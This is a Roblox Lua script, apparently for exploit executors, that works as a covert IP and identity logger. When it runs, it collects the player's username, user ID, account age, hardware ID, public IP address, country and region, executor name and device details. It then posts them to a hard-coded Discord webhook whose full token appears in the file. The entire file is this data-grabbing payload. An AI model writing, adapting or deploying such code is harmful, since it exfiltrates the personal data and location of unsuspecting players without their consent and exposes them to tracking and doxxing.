local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MPS = game:GetService("MarketplaceService")
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local Stats = game:FindService("Stats")

local LP = Players.LocalPlayer
local time = os.date("!%Y-%m-%d %H:%M:%S UTC")
local placeId = game.PlaceId
local gameLink = "https://www.roblox.com/games/" .. placeId

local webhookUrl = "https://discord.com/api/webhooks/1386309637824839781/DwrwUatQtTPoBJoSP1YLr0gZO5JU6QpupOktSD-zpRBo5uVVyS7e7PohrtuoinN_rwYD"

local gameName = "Không xác định"
pcall(function()
	local info = MPS:GetProductInfo(placeId)
	if info and typeof(info.Name) == "string" then
		gameName = info.Name
	end
end)

local geo = {}
pcall(function()
	local res = game:HttpGet("http://ip-api.com/json")
	if res then
		local decoded = HttpService:JSONDecode(res)
		if typeof(decoded) == "table" then geo = decoded end
	end
end)

local data = {
	username = "Maya",
	avatar_url = "https://raw.githubusercontent.com/Claireyter-Script/Cooking/main/new_logo.png",
	embeds = {{
		title = "📩 Tệp lệnh đã được kích hoạt! Nowhywhats hãy xem!",
		color = 0x007AFF,
		fields = {},
		footer = { text = "Webhook log" }
	}}
}

local function addField(name, value, inline)
	if name and value and (typeof(value) == "string" or typeof(value) == "number") then
		table.insert(data.embeds[1].fields, {
			name = tostring(name),
			value = tostring(value),
			inline = inline or false
		})
	end
end

if LP then
	addField("👤 Người chơi", "**Username:** " .. LP.Name .. "\n**DisplayName:** " .. LP.DisplayName, true)
	addField("🆔 ID", "**UserId:** " .. LP.UserId .. "\n**Tuổi tài khoản:** " .. LP.AccountAge .. " ngày", true)
end
addField("🎮 Game", "[" .. gameName .. "](" .. gameLink .. ")", false)
addField("🕓 Thời gian", time, false)

pcall(function()
	if identifyexecutor and typeof(identifyexecutor) == "function" then
		local ex = identifyexecutor()
		if ex then addField("💻 Executor", ex, true) end
	end
end)
pcall(function()
	if gethwid and typeof(gethwid) == "function" then
		local hwid = gethwid()
		if hwid then addField("🧬 HWID", hwid, true) end
	end
end)

pcall(function()
	local req = http_request or request or (syn and syn.request)
	if req then
		for _, url in ipairs({ "https://api.ipify.org", "https://ifconfig.me/ip", "https://ipinfo.io/ip" }) do
			local ok, res = pcall(function() return req({ Url = url, Method = "GET" }) end)
			if ok and res and res.Body then
				local ip = res.Body:match("[^\r\n]+")
				if ip and ip:match("%d+%.%d+%.%d+%.%d+") then
					addField("🌐 IP", ip, true)
					break
				end
			end
		end
	end
end)

if geo and geo.country and geo.regionName then
	addField("🌎 Quốc gia", geo.country .. ", " .. geo.regionName, true)
end

if LP and LP.MembershipType then
	addField("💳 Thành viên", tostring(LP.MembershipType), true)
end

if UIS then
	addField("📱 Thiết bị", UIS.TouchEnabled and "Mobile" or "PC", true)
	local input = UIS.KeyboardEnabled and "Keyboard" or UIS.GamepadEnabled and "Gamepad" or "Touch"
	addField("⌨️ Đầu vào", input, true)
end

pcall(function()
	if typeof(version) == "function" then
		addField("📦 Phiên bản client", version(), true)
	end
end)

pcall(function()
	local count = 0
	local start = tick()
	local conn = RS.RenderStepped:Connect(function()
		count += 1
	end)
	task.wait(1)
	conn:Disconnect()
	addField("🎯 FPS", count, true)
end)

pcall(function()
	if Stats then
		local perf = Stats:FindFirstChild("PerformanceStats")
		local mem = perf and perf:FindFirstChild("TotalMemory")
		if mem and mem:IsA("NumberValue") then
			addField("🧠 Memory (MB)", math.floor(mem.Value), true)
		end
	end
end)

pcall(function()
	if getfpscap and typeof(getfpscap) == "function" then
		local cap = getfpscap()
		if cap then addField("🎞️ FPS Cap", cap, true) end
	end
end)

local req = http_request or request or (syn and syn.request)
if req then
	pcall(function()
		req({
			Url = webhookUrl,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(data)
		})
	end)
else
	warn("Dump")
end
